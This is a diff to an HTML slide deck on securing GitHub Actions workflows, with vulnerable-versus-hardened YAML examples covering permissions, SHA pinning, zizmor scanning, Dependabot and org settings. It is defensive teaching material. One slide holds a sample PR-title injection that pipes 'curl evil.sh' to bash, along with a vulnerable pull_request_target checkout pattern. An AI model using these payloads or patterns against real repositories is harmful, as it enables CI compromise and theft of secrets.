@@ -896,6 +896,93 @@
       </section>
 
       <section>
+        <section id="workflow-perms-pin">
+          <h2>Workflow-Level Hardening in YAML</h2>
+          <div class="content">
+            <p style="margin-bottom: 12px; font-size: 14pt;">Deny-by-default permissions, SHA-pinned actions, no checkout credentials left behind, no lifecycle scripts.</p>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+              <div>
+                <p style="font-weight: 700; font-size: 13pt; color: var(--primary-color); margin-bottom: 6px;"><i class="fa-solid fa-xmark"></i> Vulnerable defaults</p>
+<pre style="background: #1a1a2e; color: #e4e4f1; padding: 12px 14px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 11pt; line-height: 1.35; margin: 0; border-left: 4px solid var(--primary-color);">on: [push, pull_request]
+<span style="color: #888;"># no permissions: block</span>
+<span style="color: #ff8a8a;"># GITHUB_TOKEN defaults to read/write all scopes</span>
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout<span style="color: #ff8a8a;">@v5</span>
+        <span style="color: #888;"># persist-credentials defaults to true</span>
+      - uses: actions/setup-node<span style="color: #ff8a8a;">@v4</span>
+      - run: <span style="color: #ff8a8a;">npm install</span>
+        <span style="color: #888;"># runs preinstall / postinstall hooks</span></pre>
+              </div>
+              <div>
+                <p style="font-weight: 700; font-size: 13pt; color: var(--secondary-color); margin-bottom: 6px;"><i class="fa-solid fa-check"></i> Hardened</p>
+<pre style="background: #1a1a2e; color: #e4e4f1; padding: 12px 14px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 11pt; line-height: 1.35; margin: 0; border-left: 4px solid var(--secondary-color);">on: [push, pull_request]
+<span style="color: #ffd866;">permissions: {}</span>   <span style="color: #888;"># deny all</span>
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    <span style="color: #ffd866;">permissions:
+      contents: read</span>   <span style="color: #888;"># opt in to minimum</span>
+    steps:
+      - uses: actions/checkout<span style="color: #ffd866;">@93cb6efe...</span>
+        with:
+          <span style="color: #ffd866;">persist-credentials: false</span>
+      - uses: actions/setup-node<span style="color: #ffd866;">@a0853c24...</span>
+      - run: <span style="color: #ffd866;">npm ci --ignore-scripts</span></pre>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section id="workflow-untrusted">
+          <h2>Untrusted Input - Don't Pipe to Shell</h2>
+          <div class="content">
+            <p style="margin-bottom: 12px; font-size: 14pt;">Event data (PR titles, comments, branch names) is attacker-controlled. Treat it as data, never as code.</p>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+              <div>
+                <p style="font-weight: 700; font-size: 13pt; color: var(--primary-color); margin-bottom: 6px;"><i class="fa-solid fa-xmark"></i> Vulnerable: interpolation + remote pipe</p>
+<pre style="background: #1a1a2e; color: #e4e4f1; padding: 12px 14px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 11pt; line-height: 1.35; margin: 0; border-left: 4px solid var(--primary-color);"><span style="color: #888;"># Ultralytics-class injection</span>
+- run: |
+    echo "PR: <span style="color: #ff8a8a;">${{ github.event.pull_request.title }}</span>"
+    <span style="color: #888;"># title: "; curl evil.sh | bash; #"</span>
+
+<span style="color: #888;"># Pwn Request: PR_target with attacker checkout</span>
+on: pull_request_target
+jobs:
+  test:
+    steps:
+      - uses: actions/checkout@SHA
+        with:
+          <span style="color: #ff8a8a;">ref: ${{ github.event.pull_request.head.sha }}</span>
+      - run: <span style="color: #ff8a8a;">curl https://install.sh | bash</span></pre>
+              </div>
+              <div>
+                <p style="font-weight: 700; font-size: 13pt; color: var(--secondary-color); margin-bottom: 6px;"><i class="fa-solid fa-check"></i> Hardened: env-vars, split jobs, pinned scripts</p>
+<pre style="background: #1a1a2e; color: #e4e4f1; padding: 12px 14px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 11pt; line-height: 1.35; margin: 0; border-left: 4px solid var(--secondary-color);"><span style="color: #888;"># Treat title as data, not code</span>
+- env:
+    <span style="color: #ffd866;">PR_TITLE: ${{ github.event.pull_request.title }}</span>
+  run: |
+    echo "PR: <span style="color: #ffd866;">$PR_TITLE</span>"
+
+<span style="color: #888;"># Untrusted code runs in unprivileged job</span>
+on: pull_request   <span style="color: #888;"># not _target</span>
+jobs:
+  test:
+    permissions: { <span style="color: #ffd866;">contents: read</span> }
+    steps:
+      - uses: actions/checkout@SHA
+      - run: <span style="color: #ffd866;">./scripts/install.sh</span>
+        <span style="color: #888;"># committed copy, not piped from web</span></pre>
+              </div>
+            </div>
+          </div>
+        </section>
+      </section>
+
+      <section>
         <section id="workflow-build-job">
           <h2>Build Job: Zero Secrets</h2>
           <div class="content">
@@ -980,46 +1067,6 @@
         </section>
       </section>
 
-      <section id="workflow-controls">
-        <h2>Key Workflow Controls — What Each Buys You</h2>
-        <div class="content">
-          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 14px;">
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><code>permissions: &#123;&#125;</code> at workflow level</p>
-              <p style="font-size: 13pt;">Forces each job to opt in. Pwn Request attacks depend on over-permissioned workflows. This breaks them.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;">SHA-pinned <code>uses:</code> references</p>
-              <p style="font-size: 13pt;">Tag hijacking (March 2026 attacks) doesn't affect pinned SHAs. Dependabot keeps them updated automatically.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;">Trusted Publishing (OIDC) — no stored tokens</p>
-              <p style="font-size: 13pt;">Short-lived credentials per publish. The Ultralytics breach was worsened by an unrevoked PyPI token still in GitHub Actions.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><code>npm ci --ignore-scripts</code></p>
-              <p style="font-size: 13pt;">Blocks <code>preinstall</code>/<code>postinstall</code> — the delivery method for Bitwarden CLI, Axios, and Shai-Hulud payloads.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><code>persist-credentials: false</code> on checkout</p>
-              <p style="font-size: 13pt;">Default checkout leaves a token usable for git operations. Anything compromised after checkout could push code as you.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;">Dry-run install + file-size alerting</p>
-              <p style="font-size: 13pt;">Install the built package in a clean dir and inspect what shipped. A 59.8 MB CLI package is exactly the anomaly a smoke test catches.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><code>--provenance</code> / PyPI attestations</p>
-              <p style="font-size: 13pt;">SLSA provenance creates a signed record linking artifact to workflow &amp; commit. PyPI used this to detect forged Ultralytics releases.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><code>environment: release</code> with required reviewers</p>
-              <p style="font-size: 13pt;">Human must click "approve" before the publish job can start — final checkpoint even if everything upstream is compromised.</p>
-            </div>
-          </div>
-        </div>
-      </section>
-
       <section id="workflow-ai-controls">
         <h2>AI Actions in YAML</h2>
         <div class="content">
@@ -1057,38 +1104,78 @@
         </div>
       </section>
 
-      <section id="workflow-automation">
-        <h2>Keeping the Workflow Healthy</h2>
-        <div class="content">
-          <p style="margin-bottom: 14px; font-size: 14pt;">A hardened workflow drifts back to unsafe defaults without automation. Layer continuous validation, dependency refresh, and shared templates on top of the per-job controls.</p>
-          <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px;">
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-magnifying-glass-chart"></i> <code>zizmor</code> in CI</p>
-              <p style="font-size: 13pt;">Trail of Bits workflow scanner. Catches <code>pull_request_target</code> misuse, missing permissions, unpinned actions, and script-injection patterns. Run report-only first; flip to enforcement once clean. SARIF output lands in the GitHub Security tab.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-arrows-rotate"></i> Dependabot for Actions</p>
-              <p style="font-size: 13pt;">Add <code>package-ecosystem: github-actions</code> to <code>.github/dependabot.yml</code>. SHA-pinning is only safe if pins stay current - Dependabot opens PRs to bump them.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-file-code"></i> Shared workflow templates</p>
-              <p style="font-size: 13pt;">Publish hardened starter files in <code>.github/workflow-templates/</code> at the org level. New repos pick them up by default; passes <code>zizmor</code> on day one.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-ban"></i> No <code>curl &#124; bash</code></p>
-              <p style="font-size: 13pt;">Never pipe remote scripts straight to a shell in CI. Download, inspect, commit a pinned copy, then execute - the remote URL is a hijack target.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-person-military-pointing"></i> First-time contributor approval</p>
-              <p style="font-size: 13pt;">Repo setting that requires manual approval before workflows run for new external contributors. Breaks the prt-scan-style "open 256+ PRs and let CI leak secrets" pattern.</p>
-            </div>
-            <div class="card" style="padding: 12px 16px;">
-              <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-code-branch"></i> <code>pull_request_target</code> hygiene</p>
-              <p style="font-size: 13pt;">If you must use it, never check out untrusted PR head ref in the same job. Split into a privileged "trigger" job and an unprivileged "test" job, or use <code>pull_request</code> instead.</p>
+      <section>
+        <section id="workflow-validation">
+          <h2>Continuous Validation in YAML</h2>
+          <div class="content">
+            <p style="margin-bottom: 12px; font-size: 14pt;">SHA pins drift; new workflows skip the rules. Add automated validation to keep the deck healthy.</p>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+              <div>
+                <p style="font-weight: 700; font-size: 13pt; color: var(--accent-blue); margin-bottom: 6px;"><i class="fa-solid fa-magnifying-glass-chart"></i> <code>zizmor</code> as a required check</p>
+<pre style="background: #1a1a2e; color: #e4e4f1; padding: 12px 14px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 11pt; line-height: 1.35; margin: 0;"><span style="color: #888;"># .github/workflows/zizmor.yml</span>
+on:
+  pull_request:
+  push: { branches: [main] }
+<span style="color: #ffd866;">permissions: {}</span>
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    <span style="color: #ffd866;">permissions:
+      security-events: write
+      contents: read</span>
+    steps:
+      - uses: actions/checkout@93cb6efe...
+      - uses: <span style="color: #ffd866;">zizmorcore/zizmor-action@SHA</span>
+      - uses: github/codeql-action/upload-sarif@SHA
+        with: { sarif_file: zizmor.sarif }</pre>
+                <p style="font-size: 12pt; color: var(--muted-color); margin-top: 6px;">Start in report-only mode; flip to enforcement once existing workflows pass. SARIF lands in the GitHub Security tab.</p>
+              </div>
+              <div>
+                <p style="font-weight: 700; font-size: 13pt; color: var(--accent-blue); margin-bottom: 6px;"><i class="fa-solid fa-arrows-rotate"></i> Dependabot keeps SHAs current</p>
+<pre style="background: #1a1a2e; color: #e4e4f1; padding: 12px 14px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 11pt; line-height: 1.35; margin: 0;"><span style="color: #888;"># .github/dependabot.yml</span>
+version: 2
+updates:
+  - <span style="color: #ffd866;">package-ecosystem: github-actions</span>
+    directory: /
+    schedule: { interval: weekly }
+    groups:
+      actions:
+        patterns: ["*"]
+
+  - package-ecosystem: npm
+    directory: /
+    schedule: { interval: weekly }</pre>
+                <p style="font-size: 12pt; color: var(--muted-color); margin-top: 6px;">SHA pinning only works if pins stay fresh. Dependabot auto-opens PRs to bump them - and updates the comment with the new tag.</p>
+              </div>
             </div>
           </div>
-        </div>
-        <div class="footnote">Sources: Trail of Bits - zizmor; GitHub Docs - Dependabot for Actions, workflow templates, first-time contributor approval; Wiz &amp; safedep - prt-scan campaign analysis.</div>
+          <div class="footnote">Sources: Trail of Bits - zizmor; GitHub Docs - Dependabot for Actions; GitHub CodeQL SARIF upload.</div>
+        </section>
+        <section id="workflow-org-defaults">
+          <h2>Org-Level Defaults</h2>
+          <div class="content">
+            <p style="margin-bottom: 14px; font-size: 14pt;">Some hardening lives outside the workflow - in repo and org settings, or as starter files for new repos.</p>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+              <div class="card" style="padding: 12px 16px;">
+                <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-file-code"></i> Hardened workflow templates</p>
+                <p style="font-size: 13pt;">Publish starter files in <code>&lt;org&gt;/.github/workflow-templates/</code>. New repos pick them up by default - they pass <code>zizmor</code> on day one without modification.</p>
+              </div>
+              <div class="card" style="padding: 12px 16px;">
+                <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-person-military-pointing"></i> Require approval for first-time contributors</p>
+                <p style="font-size: 13pt;">Repo setting <em>Require approval for all outside collaborators</em>. Breaks the prt-scan pattern (an unknown account opens 256+ trojanized PRs and CI silently runs each one).</p>
+              </div>
+              <div class="card" style="padding: 12px 16px;">
+                <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-flask-vial"></i> Dry-run + size check before publish</p>
+                <p style="font-size: 13pt;">In the publish job: <code>npm pack</code> / <code>python -m build</code>, install into a clean dir, inspect contents and tarball size. The Claude Code 59.8 MB anomaly is exactly the case a smoke test catches.</p>
+              </div>
+              <div class="card" style="padding: 12px 16px;">
+                <p style="font-size: 13pt; color: var(--accent-blue); font-weight: 700; margin-bottom: 4px;"><i class="fa-solid fa-certificate"></i> Branch &amp; tag protection (Rulesets)</p>
+                <p style="font-size: 13pt;">Required PR reviews, signed commits, tag protection on <code>v*</code>. Modern GitHub <strong>Rulesets</strong> are the recommended primitive - branch protections still work but rulesets is where new features land.</p>
+              </div>
+            </div>
+          </div>
+          <div class="footnote">Sources: GitHub Docs - workflow templates, repository rulesets, first-time contributor approval; InfoQ - Claude Code 59.8 MB source-map leak.</div>
+        </section>
       </section>
 
       <section id="takeaways">
